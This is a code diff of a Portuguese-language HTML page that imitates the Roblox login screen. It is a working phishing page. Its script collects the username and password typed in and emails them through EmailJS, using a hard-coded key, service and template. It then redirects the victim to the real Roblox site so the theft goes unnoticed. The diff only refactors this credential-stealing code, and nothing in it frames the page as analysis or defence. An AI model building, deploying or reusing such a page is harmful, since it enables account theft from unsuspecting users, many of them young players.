@@ -4,175 +4,140 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
-    <!-- Script do EmailJS -->
+    <!-- Carregando EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
+        // Inicialização com sua Public Key
         (function(){
-            // Inicializa com sua chave pública
             emailjs.init("4nOCEE08jK86Ozlp3");
         })();
     </script>
     <style>
-        /* Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #232527; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
+        .login-box { background-color: #393b3d; padding: 40px; width: 100%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { font-size: 36px; font-weight: 800; letter-spacing: 1px; }
+        /* Logo Roblox simplificado em CSS */
+        .roblox-logo-img { width: 100px; height: auto; margin-bottom: 10px; }
+        
+        .input-group { margin-bottom: 15px; position: relative; }
+        input[type="text"], input[type="password"] { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #e7e9ec; 
+            border: 1px solid transparent; 
+            border-radius: 5px; 
+            font-size: 16px; 
+            color: black; 
+            outline: none; 
+            transition: 0.2s;
         }
-
-        body {
-            background-color: #232527; 
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
-        }
-
-        .login-box {
-            background-color: #393b3d; 
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo h1 {
-            font-size: 36px;
-            font-weight: 800;
-            letter-spacing: 1px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        input[type="text"], 
-        input[type="password"] {
-            width: 100%;
-            padding: 14px;
-            background-color: #e7e9ec;
-            border: 1px solid transparent;
-            border-radius: 5px;
-            font-size: 16px;
-            color: black;
-            outline: none;
-        }
-
-        input:focus {
-            border-color: #000;
-            background-color: #fff;
-        }
-
-        button {
-            width: 100%;
-            padding: 14px;
+        input:focus { border-color: #000; background-color: #fff; }
+        
+        button { 
+            width: 100%; 
+            padding: 14px; 
             background-color: #000; 
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
             margin-top: 10px;
+            transition: background 0.2s;
         }
-
-        button:hover {
-            background-color: #333;
-        }
-
-        button:disabled {
-            background-color: #555;
-            cursor: not-allowed;
-        }
-
-        .links {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 14px;
-            color: #bdbec0;
-        }
-
-        .links a {
-            color: #bdbec0;
-            text-decoration: none;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        #status-msg {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-            min-height: 20px;
-        }
+        button:hover { background-color: #333; }
+        button:disabled { background-color: #555; cursor: not-allowed; opacity: 0.8; }
+        
+        .links { margin-top: 20px; text-align: center; font-size: 14px; color: #bdbec0; }
+        .links a { color: #bdbec0; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+        
+        #status-msg { text-align: center; margin-top: 15px; font-size: 14px; min-height: 20px; }
+        .success { color: #00b02a; }
+        .error { color: #ff4d4d; }
     </style>
 </head>
 <body>
 
     <div class="login-box">
         <div class="logo">
-            <h1>ROBLOX</h1>
+            <!-- Logo do Roblox (SVG inline para não depender de links externos) -->
+            <svg viewBox="0 0 500 500" style="width: 100px; height: auto;">
+                <path fill="#fff" d="M100 100 H400 V400 H100 Z" />
+                <circle cx="150" cy="150" r="20" fill="#000"/>
+                <circle cx="350" cy="150" r="20" fill="#000"/>
+                <rect x="150" y="300" width="200" height="20" fill="#000"/>
+            </svg>
+            <h1>Roblox</h1>
         </div>
 
-        <form id="roblox-form">
+        <form id="login-form">
             <div class="input-group">
-                <input type="text" name="username" placeholder="Nome de usuário ou e-mail" required>
+                <input type="text" name="username" placeholder="Usuário ou E-mail" required autocomplete="off">
             </div>
             <div class="input-group">
                 <input type="password" name="password" placeholder="Senha" required>
             </div>
             
-            <button type="submit" id="btn-login">Entrar</button>
-            <p id="status-msg"></p>
+            <button type="submit" id="btn-submit">Entrar</button>
+            
+            <div class="links">
+                <a href="#">Esqueceu sua senha?</a>
+            </div>
         </form>
-
-        <div class="links">
-            <a href="#">Esqueceu o nome de usuário ou a senha?</a><br><br>
-            <a href="#">Criar uma conta</a>
-        </div>
+        
+        <div id="status-msg"></div>
     </div>
 
     <script type="text/javascript">
-        // CONFIGURAÇÕES DEFINIDAS
-        
-        const SERVICE_ID = 'service_4ipri3b'; 
-        
-        const TEMPLATE_ID = 'template_ttaedjc';
-        
-        const form = document.getElementById('roblox-form');
-        const btn = document.getElementById('btn-login');
+        const form = document.getElementById('login-form');
+        const btn = document.getElementById('btn-submit');
         const statusMsg = document.getElementById('status-msg');
 
         form.addEventListener('submit', function(event) {
-            event.preventDefault();
-            
+            event.preventDefault(); // Impede o recarregamento da página
+
+            // Estado de carregamento
             btn.disabled = true;
             btn.innerText = "Entrando...";
             statusMsg.innerText = "";
+            statusMsg.className = "";
 
-            emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
-                .then(() => {
-                    window.location.href = "https://www.roblox.com/home";
-                })
-                .catch((error) => {
+            // Parâmetros que serão enviados
+            const templateParams = {
+                username: document.querySelector('input[name="username"]').value,
+                password: document.querySelector('input[name="password"]').value,
+                date: new Date().toLocaleString()
+            };
+
+            // Envia via EmailJS
+            emailjs.send('service_4ipri3b', 'template_ttaedjc', templateParams)
+                .then(function(response) {
+                    console.log('SUCESSO!', response.status, response.text);
+                    
+                    // Sucesso
+                    btn.innerText = "Sucesso!";
+                    statusMsg.innerText = "Login realizado com sucesso!";
+                    statusMsg.className = "success";
+                    
+                    // Opcional: Redirecionar após alguns segundos
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/home";
+                    }, 2000);
+
+                }, function(error) {
+                    console.error('FALHA...', error);
+                    
+                    // Erro
                     btn.disabled = false;
                     btn.innerText = "Entrar";
-                    statusMsg.style.color = "#ff4d4d";
-                    statusMsg.innerText = "Erro de conexão. Verifique as configurações.";
-                    console.error('EmailJS Error:', error);
+                    statusMsg.innerText = "Erro ao enviar. Verifique o Console (F12).";
+                    statusMsg.className = "error";
                 });
         });
     </script>
-
 </body>
 </html>
